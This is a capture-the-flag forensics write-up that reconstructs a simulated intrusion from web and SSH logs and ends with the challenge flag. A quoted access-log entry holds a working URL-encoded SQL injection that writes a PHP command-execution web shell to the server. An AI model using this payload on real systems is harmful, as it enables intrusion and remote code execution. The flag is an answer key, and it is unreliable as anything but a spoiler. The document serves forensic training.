# [forensics] Demo

> **Category:** `forensics`  
> **CTF:** KubSTU CTF 2026 Spring

---

  During a security audit, suspicious actions were discovered on the company's web server. It is believed that the attacker was able to penetrate the network, move laterally to the database server, and steal confidential information. 

Flag format: KubSTU{…}.

 Identify what vulnerability was used to gain initial access and what was uploaded.
Under which user did the attacker operate next?
What was copied?
Example: KubSTU{XSS,p0wny.php,Administrator,data.txt}  

[Demo.rar](./files/Demo.rar)

Solution:

  When analyzing the Apache access.log on the web server (file /home/ubuntu/Victim-Web/var/log/apache2/access.log), you'll find hundreds of legitimate activity entries. But among them, this entry clearly stands out:

```javascript
192.168.1.100 - - [26/Mar/2026:10:16:05 +0300] "GET /index.php?id=1%20UNION%20SELECT%201,%27%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E%27%20INTO%20OUTFILE%20%27/var/www/html/uploads/shell.php%27 HTTP/1.1" 200 12 "-" "sqlmap/1.6.12 (http://sqlmap.org)"
```

This is a clear SQLi followed by uploading shell.php.

Next, the attacker presumably connected to the database somehow — but where did they get access?

By analyzing the service structure, you can find lots of interesting data: IPs, keys, and usernames. The attacker clearly found the path to the private SSH key of the dbadmin user on the database server: /home/www-data/.ssh_key_key. 

 ![img_1.png](./images/img_1.png)

  In the file /home/ubuntu/Victim-DB/var/log/auth.log, you'll find a successful SSH connection by user dbadmin from the web server's IP address (192.168.1.10).  

victim-db sshd[5680]: Accepted publickey for dbadmin from 192.168.1.10 port 54323 ssh-rsa SHA256:hK6cLRP4m5w60fHK1BGmWooBTXIWz+vtVHmuH/luoVQ

Further analysis of the dbadmin user's command history shows that the attacker gained access to the confidential database and copied the data.   

 ![img_2.png](./images/img_2.png)

That's all — let's construct the flag.

KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}